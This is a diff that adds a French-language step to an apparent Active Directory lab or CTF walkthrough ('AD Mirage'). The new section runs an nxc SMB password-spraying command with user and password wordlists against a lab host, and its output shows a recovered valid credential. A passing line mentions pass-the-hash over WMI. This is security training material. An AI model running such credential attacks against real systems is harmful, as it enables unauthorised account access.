@@ -443,7 +443,18 @@ Note : on peut aussi se connecter via WMI directement en faisant un PASS THE HAS
 
 Level 9 (AD Mirage) : Enumeration de users sur le port 445
 
+!!! Fournir liste users.txt et password.txt !!!
 
+La commande permet de lister les utilisateurs possible avec le password. Pour cela, on utilise l'outil nxc qui realiser cette attaque sur le port 445.
+Pour cela, le pentester aura en sa possession, une wordlist de USER et de PASSWORD.
+
+```shell
+nxc smb 10.1.3.1 -u users.txt -p passwords.txt -t 16
+
+SMB         10.1.3.1        445    WINDOWS-7HBD3FQ  [+] mirage.local\FrankCatton:P@ssw0rd 
+```
+
+Grace à cela il trouve un utilisateur valide. Il peut désormais se connecter au paratge SMB du AD "mirage.local" et s'y intéresser....
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
